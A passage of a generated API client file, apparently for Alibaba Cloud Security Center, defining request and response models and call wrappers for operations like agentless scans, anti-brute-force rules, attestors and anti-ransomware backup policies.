 * @summary Clones an existing security report. The new security report has the same configuration as the existing security report.
 *
 * @param request CopyCustomizeReportConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CopyCustomizeReportConfigResponse
 */
async function copyCustomizeReportConfigWithOptions(request: CopyCustomizeReportConfigRequest, runtime: Util.RuntimeOptions): CopyCustomizeReportConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.reportId)) {
    query['ReportId'] = request.reportId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CopyCustomizeReportConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Clones an existing security report. The new security report has the same configuration as the existing security report.
 *
 * @param request CopyCustomizeReportConfigRequest
 * @return CopyCustomizeReportConfigResponse
 */
async function copyCustomizeReportConfig(request: CopyCustomizeReportConfigRequest): CopyCustomizeReportConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return copyCustomizeReportConfigWithOptions(request, runtime);
}

model CreateAgentlessScanTaskRequest {
  assetSelectionType?: string(name='AssetSelectionType', description='Identification of asset selection.', example='AGENTLESS_SCAN_ONCE_TASK_1720145******'),
  autoDeleteDays?: int32(name='AutoDeleteDays', description='The retention period of images. Unit: days.', example='1'),
  releaseAfterScan?: boolean(name='ReleaseAfterScan', description='Specifies whether to enable the cost-saving mode. Valid values:

*   **true**
*   **false**', example='true'),
  scanDataDisk?: boolean(name='ScanDataDisk', description='Specifies whether to check data disks. Valid values:

*   **true**
*   **false**', example='true'),
  targetType?: int32(name='TargetType', description='The type of the detection object. Valid values:

*   **2**: image

This parameter is required.', example='2'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of the assets on which you want to run the detection task.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.'),
}

model CreateAgentlessScanTaskResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='E90DE229-9FC6-58F6-BF4B-03AD6179****'),
}

model CreateAgentlessScanTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateAgentlessScanTaskResponseBody(name='body'),
}

/**
 * @summary Creates an agentless detection task.
 *
 * @param request CreateAgentlessScanTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateAgentlessScanTaskResponse
 */
async function createAgentlessScanTaskWithOptions(request: CreateAgentlessScanTaskRequest, runtime: Util.RuntimeOptions): CreateAgentlessScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.assetSelectionType)) {
    query['AssetSelectionType'] = request.assetSelectionType;
  }
  if (!Util.isUnset(request.autoDeleteDays)) {
    query['AutoDeleteDays'] = request.autoDeleteDays;
  }
  if (!Util.isUnset(request.releaseAfterScan)) {
    query['ReleaseAfterScan'] = request.releaseAfterScan;
  }
  if (!Util.isUnset(request.scanDataDisk)) {
    query['ScanDataDisk'] = request.scanDataDisk;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateAgentlessScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates an agentless detection task.
 *
 * @param request CreateAgentlessScanTaskRequest
 * @return CreateAgentlessScanTaskResponse
 */
async function createAgentlessScanTask(request: CreateAgentlessScanTaskRequest): CreateAgentlessScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return createAgentlessScanTaskWithOptions(request, runtime);
}

model CreateAntiBruteForceRuleRequest {
  defaultRule?: boolean(name='DefaultRule', description='Specifies whether to set the defense rule as the default rule. Valid values:

*   **true**: yes
*   **false**: no

>  If no defense rule is created for a server, the default rule is applied to the server.', example='true'),
  failCount?: int32(name='FailCount', description='The maximum number of failed logon attempts from an account. Valid values: 2, 3, 4, 5, 10, 50, 80, and 100.

This parameter is required.', example='2'),
  forbiddenTime?: int32(name='ForbiddenTime', description='The period of time during which logons from an account are not allowed. Unit: minutes. Valid values:

*   **5**: 5 minutes
*   **15**: 15 minutes
*   **30**: 30 minutes
*   **60**: 1 hour
*   **120**: 2 hours
*   **360**: 6 hours
*   **720**: 12 hours
*   **1440**: 24 hours
*   **10080**: 7 days
*   **52560000**: permanent

This parameter is required.', example='5'),
  name?: string(name='Name', description='The name of the defense rule.

This parameter is required.', example='TestAntiBruteForceRule'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
  span?: int32(name='Span', description='The maximum period of time during which failed logon attempts from an account can occur. Unit: minutes. Valid values:

*   **1**
*   **2**
*   **5**
*   **10**
*   **15**

>  To configure a defense rule, you must specify the Span, FailCount, and ForbiddenTime parameters. If the number of failed logon attempts from an account within the minutes specified by Span exceeds the value specified by FailCount, the account cannot be used for logons within the minutes specified by ForbiddenTime.

This parameter is required.', example='1'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers to which you want to apply the defense rule.

This parameter is required.'),
}

model CreateAntiBruteForceRuleResponseBody = {
  createAntiBruteForceRule?: {
    ruleId?: long(name='RuleId', description='The ID of the defense rule.', example='65778'),
  }(name='CreateAntiBruteForceRule', description='The information about the defense rule.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F35F45B0-5D6B-4238-BE02-A62D0760E840'),
}

model CreateAntiBruteForceRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateAntiBruteForceRuleResponseBody(name='body'),
}

/**
 * @summary Creates a defense rule against brute-force attacks.
 *
 * @param request CreateAntiBruteForceRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateAntiBruteForceRuleResponse
 */
async function createAntiBruteForceRuleWithOptions(request: CreateAntiBruteForceRuleRequest, runtime: Util.RuntimeOptions): CreateAntiBruteForceRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.defaultRule)) {
    query['DefaultRule'] = request.defaultRule;
  }
  if (!Util.isUnset(request.failCount)) {
    query['FailCount'] = request.failCount;
  }
  if (!Util.isUnset(request.forbiddenTime)) {
    query['ForbiddenTime'] = request.forbiddenTime;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.span)) {
    query['Span'] = request.span;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateAntiBruteForceRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a defense rule against brute-force attacks.
 *
 * @param request CreateAntiBruteForceRuleRequest
 * @return CreateAntiBruteForceRuleResponse
 */
async function createAntiBruteForceRule(request: CreateAntiBruteForceRuleRequest): CreateAntiBruteForceRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return createAntiBruteForceRuleWithOptions(request, runtime);
}

model CreateAssetSelectionConfigRequest {
  businessType?: string(name='BusinessType', description='The feature that you want to select for the asset. Valid values:

*   **VIRUS_SCAN_CYCLE_CONFIG**: virus detection and removal
*   **VIRUS_SCAN_ONCE_TASK**: one-time scan for viruses
*   **AGENTLESS_MALICIOUS_WHITE_LIST_[ID]**: a whitelist rule for alerts that are detected by using the agentless detection feature
*   **AGENTLESS_VUL_WHITE_LIST_[ID]**: a whitelist rule for vulnerabilities that are detected by using the agentless detection feature
*   **FILE_PROTECT_RULE_SWITCH_TYPE_[ID]**: core file protection

This parameter is required.', example='VIRUS_SCAN_CYCLE_CONFIG'),
  platform?: string(name='Platform', description='The operating system of the asset. Valid values:

*   **all**: all operating systems
*   **windows**: the Windows operating system
*   **linux**: the Linux operating system

>  If you leave this parameter empty, the system automatically selects a value for the parameter based on the value of the **BusinessType** parameter.

*   If the BusinessType parameter is set to **VIRUS_SCAN_CYCLE_CONFIG**, the value of the Platform parameter is **all**.

*   If the BusinessType parameter is set to **VIRUS_SCAN_ONCE_TASK**, the value of the Platform parameter is **all**.

*   If the BusinessType parameter is set to **AGENTLESS_MALICIOUS_WHITE_LIST_[ID]**, the value of the Platform parameter is **all**.

*   If the BusinessType parameter is set to **AGENTLESS_VUL_WHITE_LIST_[ID]** the value of the Platform parameter is **all**.

*   If the BusinessType parameter is set to **FILE_PROTECT_RULE_SWITCH_TYPE_[ID]**, the value of the Platform parameter is **linux**.', example='linux'),
  targetType?: string(name='TargetType', description='The dimension based on which you want to select the asset. Valid values:

*   **instance**: selects the asset by server.
*   **group**: selects the asset by group.
*   **vpc**: selects the asset by virtual private cloud (VPC).

This parameter is required.', example='vpc'),
}

model CreateAssetSelectionConfigResponseBody = {
  data?: {
    businessType?: string(name='BusinessType', description='The business type that is selected for the asset. Valid values:

*   **VIRUS_SCAN_CYCLE_CONFIG**: virus detection configuration
*   **VIRUS_SCAN_ONCE_TASK**: one-time scan for virus detection', example='VIRUS_SCAN_CYCLE_CONFIG'),
    platform?: string(name='Platform', description='The operating system of the asset. Valid values:

*   **windows**: the Windows operating system
*   **linux**: the Linux operating system', example='all'),
    selectionKey?: long(name='SelectionKey', description='The ID of the current asset selection. It can be used to query and modify the asset that is selected.', example='53e93435-d694-4c03-9ce7-da12bee1****'),
    targetType?: string(name='TargetType', description='The dimension based on which the asset is selected. Valid values:

*   **group**: The asset is selected by server.
*   **group**: The asset is selected by group.
*   **vpc**: The asset is selected by VPC.', example='group'),
  }(name='Data', description='The returned data.'),
  requestId?: string(name='RequestId', description='The request ID.', example='A3D7C47D-3F11-57BB-90E8-E5C20C619F37'),
}

model CreateAssetSelectionConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateAssetSelectionConfigResponseBody(name='body'),
}

/**
 * @summary Create asset selection configurations.
 *
 * @param request CreateAssetSelectionConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateAssetSelectionConfigResponse
 */
async function createAssetSelectionConfigWithOptions(request: CreateAssetSelectionConfigRequest, runtime: Util.RuntimeOptions): CreateAssetSelectionConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.businessType)) {
    query['BusinessType'] = request.businessType;
  }
  if (!Util.isUnset(request.platform)) {
    query['Platform'] = request.platform;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateAssetSelectionConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Create asset selection configurations.
 *
 * @param request CreateAssetSelectionConfigRequest
 * @return CreateAssetSelectionConfigResponse
 */
async function createAssetSelectionConfig(request: CreateAssetSelectionConfigRequest): CreateAssetSelectionConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return createAssetSelectionConfigWithOptions(request, runtime);
}

model CreateAttestorRequest {
  keyId?: string(name='KeyId', description='The ID of the KMS key.', example='2e81355b-f8e7-4090-8082-a8f8124a****'),
  keyRegionId?: string(name='KeyRegionId', description='The region ID of the Key Management Service (KMS) key.', example='cn-hangzhou'),
  keyVersionId?: string(name='KeyVersionId', description='The version ID of the KMS key.', example='8d7c9c91-57ce-4cf4-a959-1e700e13****'),
  name?: string(name='Name', description='The name of the witness.', example='attestor-auto-ad5316'),
  remark?: string(name='Remark', description='The description.', example='attestor'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address.', example='192.168.XX.XX'),
}

model CreateAttestorResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='B44EA7F0-497A-5F10-B5A8-87291356****'),
}

model CreateAttestorResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateAttestorResponseBody(name='body'),
}

/**
 * @summary Creates a witness.
 *
 * @param request CreateAttestorRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateAttestorResponse
 */
async function createAttestorWithOptions(request: CreateAttestorRequest, runtime: Util.RuntimeOptions): CreateAttestorResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.keyId)) {
    query['KeyId'] = request.keyId;
  }
  if (!Util.isUnset(request.keyRegionId)) {
    query['KeyRegionId'] = request.keyRegionId;
  }
  if (!Util.isUnset(request.keyVersionId)) {
    query['KeyVersionId'] = request.keyVersionId;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateAttestor',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a witness.
 *
 * @param request CreateAttestorRequest
 * @return CreateAttestorResponse
 */
async function createAttestor(request: CreateAttestorRequest): CreateAttestorResponse {
  var runtime = new Util.RuntimeOptions{};
  return createAttestorWithOptions(request, runtime);
}

model CreateBackupPolicyRequest {
  name?: string(name='Name', description='The name of the anti-ransomware policy.

This parameter is required.', example='ServerBackUpPolicy01'),
  policy?: map[string]any(name='Policy', description='*   **IsDefault**: the type of the anti-ransomware policy. Valid values:

    *   **1**: recommended policy
    *   **0**: custom policy

*   **Include**: the format of the files that you want to protect. If you want to protect the files in all formats, set this field to [].

*   **Source**: the directory that you want to protect. If you want to protect all directories, set this field to [].

*   **ExcludeSystemPath**: specifies whether to exclude a specific directory from the anti-ransomware policy. If you want to exclude a directory, set this field to **true**. If you do not want to exclude a directory, leave this field empty.

*   **Exclude**: the directory that you want to exclude from the anti-ransomware policy. If you do not want to exclude a directory, set this field to [].

*   **Schedule**: the start time and interval of a data backup task. We recommend that you specify a start time that begins during off-peak hours but does not start on the hour. Examples:

    *   If you set this field to I|1583216092|P21D, the data backup task starts from 2020-03-03 14:14:52, and the task is run at an interval of three weeks.
    *   If you set this field to I|1583216092|PT24H, the data backup task starts from 2020-03-03 14:14:52, and the task is run at an interval of 24 hours.

*   **Retention**: the period during which backup data is retained. Unit: days. If you set this field to 7, backup data is retained for a week. If you set this field to 365, backup data is retained for a year. If you set this field to -1, backup data is permanently retained.

*   **SpeedLimiter**: the limit on the network bandwidth for data backup tasks. If you set this field to 0:24:30720, the maximum bandwidth for a data backup task is 30 MB/s from 00:00 to 24:00.

*   **UseVss**: specifies whether to enable the VSS feature. The feature is available only for Windows servers. Valid values:

    *   **true**: yes
    *   **false**: no

>  The VSS feature is available only if you create the anti-ransomware policy for Windows servers. After you enable the feature, the number of backup failures due to running processes is significantly reduced. We recommend that you enable the VSS feature. After you enable the feature, the data of disks that are in the exFAT and FAT32 formats cannot be backed up.

This parameter is required.', example='"{"IsDefault":1,"Include":[],"Source":[],"Schedule":"I|1648061040|PT24H","Retention":7,"SpeedLimiter":"","ExcludeSystemPath":true,"Exclude":["/bin/","/usr/bin/","/sbin/","/boot/","/proc/","/sys/","/srv/","/lib/","/selinux/","/usr/sbin/","/run/","/lib32/","/lib64/","/lost+found/","/var/lib/kubelet/","/var/lib/ntp/proc","/var/lib/container","Windows","Python27","Program Files (x86)","Program Files","Boot","$RECYCLE.BIN","System Volume Information","Users\\\\Administrator\\\\NTUSER.DAT*","ProgramData","pagefile.sys","Users\\\\Default\\\\NTUSER.DAT*","Users\\\\Administrator\\\\ntuser.*"],"UseVss":true}"'),
  policyRegionId?: string(name='PolicyRegionId', description='The region ID of the server that is not deployed on Alibaba Cloud.

>  We recommend that you specify the ID of the supported region that is the nearest to the location of the server. You can call the [DescribeSupportRegion](~~DescribeSupportRegion~~) operation to query the supported regions of the anti-ransomware feature.', example='ch-hangzhou'),
  policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy. Set the value to **2.0.0**.

This parameter is required.', example='2.0.0'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers that you want to protect.

This parameter is required.', example='["3bb30859-b3b5-4f28-868f-b0892c98****", "3bb30859-b3b5-4f28-868f-b0892c98****"]'),
}

model CreateBackupPolicyShrinkRequest {
  name?: string(name='Name', description='The name of the anti-ransomware policy.

This parameter is required.', example='ServerBackUpPolicy01'),
  policyShrink?: string(name='Policy', description='*   **IsDefault**: the type of the anti-ransomware policy. Valid values:

    *   **1**: recommended policy
    *   **0**: custom policy

*   **Include**: the format of the files that you want to protect. If you want to protect the files in all formats, set this field to [].

*   **Source**: the directory that you want to protect. If you want to protect all directories, set this field to [].

*   **ExcludeSystemPath**: specifies whether to exclude a specific directory from the anti-ransomware policy. If you want to exclude a directory, set this field to **true**. If you do not want to exclude a directory, leave this field empty.

*   **Exclude**: the directory that you want to exclude from the anti-ransomware policy. If you do not want to exclude a directory, set this field to [].

*   **Schedule**: the start time and interval of a data backup task. We recommend that you specify a start time that begins during off-peak hours but does not start on the hour. Examples:

    *   If you set this field to I|1583216092|P21D, the data backup task starts from 2020-03-03 14:14:52, and the task is run at an interval of three weeks.
    *   If you set this field to I|1583216092|PT24H, the data backup task starts from 2020-03-03 14:14:52, and the task is run at an interval of 24 hours.

*   **Retention**: the period during which backup data is retained. Unit: days. If you set this field to 7, backup data is retained for a week. If you set this field to 365, backup data is retained for a year. If you set this field to -1, backup data is permanently retained.

*   **SpeedLimiter**: the limit on the network bandwidth for data backup tasks. If you set this field to 0:24:30720, the maximum bandwidth for a data backup task is 30 MB/s from 00:00 to 24:00.

*   **UseVss**: specifies whether to enable the VSS feature. The feature is available only for Windows servers. Valid values:

    *   **true**: yes
    *   **false**: no

>  The VSS feature is available only if you create the anti-ransomware policy for Windows servers. After you enable the feature, the number of backup failures due to running processes is significantly reduced. We recommend that you enable the VSS feature. After you enable the feature, the data of disks that are in the exFAT and FAT32 formats cannot be backed up.

This parameter is required.', example='"{"IsDefault":1,"Include":[],"Source":[],"Schedule":"I|1648061040|PT24H","Retention":7,"SpeedLimiter":"","ExcludeSystemPath":true,"Exclude":["/bin/","/usr/bin/","/sbin/","/boot/","/proc/","/sys/","/srv/","/lib/","/selinux/","/usr/sbin/","/run/","/lib32/","/lib64/","/lost+found/","/var/lib/kubelet/","/var/lib/ntp/proc","/var/lib/container","Windows","Python27","Program Files (x86)","Program Files","Boot","$RECYCLE.BIN","System Volume Information","Users\\\\Administrator\\\\NTUSER.DAT*","ProgramData","pagefile.sys","Users\\\\Default\\\\NTUSER.DAT*","Users\\\\Administrator\\\\ntuser.*"],"UseVss":true}"'),
  policyRegionId?: string(name='PolicyRegionId', description='The region ID of the server that is not deployed on Alibaba Cloud.

>  We recommend that you specify the ID of the supported region that is the nearest to the location of the server. You can call the [DescribeSupportRegion](~~DescribeSupportRegion~~) operation to query the supported regions of the anti-ransomware feature.', example='ch-hangzhou'),
  policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy. Set the value to **2.0.0**.

This parameter is required.', example='2.0.0'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers that you want to protect.

This parameter is required.', example='["3bb30859-b3b5-4f28-868f-b0892c98****", "3bb30859-b3b5-4f28-868f-b0892c98****"]'),
}

model CreateBackupPolicyResponseBody = {
  backupPolicy?: {
    id?: string(name='Id', description='The ID of the anti-ransomware policy.', example='1301575'),
    status?: string(name='Status', description='The status of the anti-ransomware policy. Valid values:

*   **enabled**
*   **disabled**

>  After you create an anti-ransomware policy, the policy is enabled by default.', example='enabled'),
  }(name='BackupPolicy', description='The information about the anti-ransomware policy.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model CreateBackupPolicyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateBackupPolicyResponseBody(name='body'),
}

/**
 * @summary Creates an anti-ransomware policy for servers.
 *
 * @param tmpReq CreateBackupPolicyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateBackupPolicyResponse
 */
async function createBackupPolicyWithOptions(tmpReq: CreateBackupPolicyRequest, runtime: Util.RuntimeOptions): CreateBackupPolicyResponse {
  Util.validateModel(tmpReq);
  var request = new CreateBackupPolicyShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.policy)) {
    request.policyShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.policy, 'Policy', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.policyShrink)) {
    query['Policy'] = request.policyShrink;
  }
  if (!Util.isUnset(request.policyRegionId)) {
    query['PolicyRegionId'] = request.policyRegionId;
  }
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateBackupPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates an anti-ransomware policy for servers.
 *
 * @param request CreateBackupPolicyRequest
 * @return CreateBackupPolicyResponse
 */
async function createBackupPolicy(request: CreateBackupPolicyRequest): CreateBackupPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return createBackupPolicyWithOptions(request, runtime);
}

model CreateBatchUploadUrlRequest {
  md5List?: [ string ](name='Md5List', description='The identifiers of files. Only MD5 hash values are supported.

This parameter is required.'),
  type?: int32(name='Type', description='The type of the file. Valid values:

*   **0**: unknown file
*   **1**: binary file
*   **2**: webshell file
*   **4**: script file

> If you do not know the type of the file, set this parameter to **0**.

This parameter is required.', example='0'),
}

model CreateBatchUploadUrlResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='DA62490B-7883-5EB4-8601-F2D1D9******'),
  uploadUrlList?: [ 
    {
      context?: {
        accessId?: string(name='AccessId', description='The AccessKey ID that is used to access the OSS bucket.', example='LTAI4G1mgPbjvGQuiV1X****'),
        ossKey?: string(name='OssKey', description='The key of the file that is used after the file is uploaded to the OSS bucket.', example='1/2022/06/23/15/41/16559701077444693a0c6-33b2-4cc2-a99f-9f38b8b8****'),
        policy?: string(name='Policy', description='The policy that poses limits on file upload. For example, the policy can limit the size of the file.', example='eyJleHBpcmF0aW9uIjoiMjAyMi0wNy0yM1QxMDo1ODoxMC****'),
        signature?: string(name='Signature', description='The signature that is used to upload the file.', example='wDhPgVdnY/bkKFYcYFl+4crl****'),
      }(name='Context', description='The signature information.'),
      expire?: string(name='Expire', description='The timestamp when the values of the parameters expire. Unit: milliseconds.', example='1658562101370'),
      fileExist?: boolean(name='FileExist', description='Indicates whether the file exists in the cloud. Valid values:

*   **true**: The file exists in the cloud. You do not need to upload the file.
*   **false**: The file does not exist in the cloud. You must upload the file.', example='false'),
      internalUrl?: string(name='InternalUrl', description='The internal endpoint of the URL to which the file is uploaded.', example='http://example.com'),
      md5?: string(name='Md5', description='The identifier of the file.', example='2f8dc248a0fbb96c69e45acad2******'),
      publicUrl?: string(name='PublicUrl', description='The public endpoint of the URL to which the file is uploaded.', example='http://example.com'),
    }
  ](name='UploadUrlList', description='An array consisting of the parameters that are required to upload a file.'),
}

model CreateBatchUploadUrlResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateBatchUploadUrlResponseBody(name='body'),
}

/**
 * @summary Queries the parameters that are required to upload a file for detection.
 *
 * @param request CreateBatchUploadUrlRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateBatchUploadUrlResponse
 */
async function createBatchUploadUrlWithOptions(request: CreateBatchUploadUrlRequest, runtime: Util.RuntimeOptions): CreateBatchUploadUrlResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.md5List)) {
    query['Md5List'] = request.md5List;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateBatchUploadUrl',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the parameters that are required to upload a file for detection.
 *
 * @param request CreateBatchUploadUrlRequest
 * @return CreateBatchUploadUrlResponse
 */
async function createBatchUploadUrl(request: CreateBatchUploadUrlRequest): CreateBatchUploadUrlResponse {
  var runtime = new Util.RuntimeOptions{};
  return createBatchUploadUrlWithOptions(request, runtime);
}

model CreateBinarySecurityPolicyRequest {
  clusters?: string(name='Clusters', description='The information about the cluster.

This parameter is required.', example='[{\\\\"ClusterId\\\\":\\\\"cc12429dbb8f644f690b0623fb52b4737\\\\",\\\\"Namespaces\\\\":[\\\\"default\\\\"]},{\\\\"ClusterId\\\\":\\\\"c9f5b93a8da8f4341b774d79fdbcedb3c\\\\",\\\\"Namespaces\\\\":[\\\\"default\\\\"]}]'),
  name?: string(name='Name', description='The name of the policy.', example='mv-test'),
  policy?: string(name='Policy', description='The content of the policy. Specify a value in the JSON format. You can specify the following keys:

*   **policyMode**: the type of the policy. Default value: requireAttestor.
*   **requiredAttestors**: the required witnesses.

This parameter is required.', example='{\\\\"PolicyMode\\\\":\\\\"requireAttestor\\\\",\\\\"RequiredAttestors\\\\":[\\\\"test-xcs-04-12-heyuan\\\\"]}'),
  remark?: string(name='Remark', description='The description.', example='remark test'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address.', example='59.82.XXX.XXX'),
  status?: string(name='Status', description='The status of the policy. Valid values:

*   **enable**
*   **disable**', example='enable'),
}

model CreateBinarySecurityPolicyResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='89AD16CC-97EE-50F3-9B12-9E28E5C8****'),
}

model CreateBinarySecurityPolicyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateBinarySecurityPolicyResponseBody(name='body'),
}

/**
 * @summary Creates a binary security policy.
 *
 * @param request CreateBinarySecurityPolicyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateBinarySecurityPolicyResponse
 */
async function createBinarySecurityPolicyWithOptions(request: CreateBinarySecurityPolicyRequest, runtime: Util.RuntimeOptions): CreateBinarySecurityPolicyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusters)) {
    query['Clusters'] = request.clusters;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.policy)) {
    query['Policy'] = request.policy;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
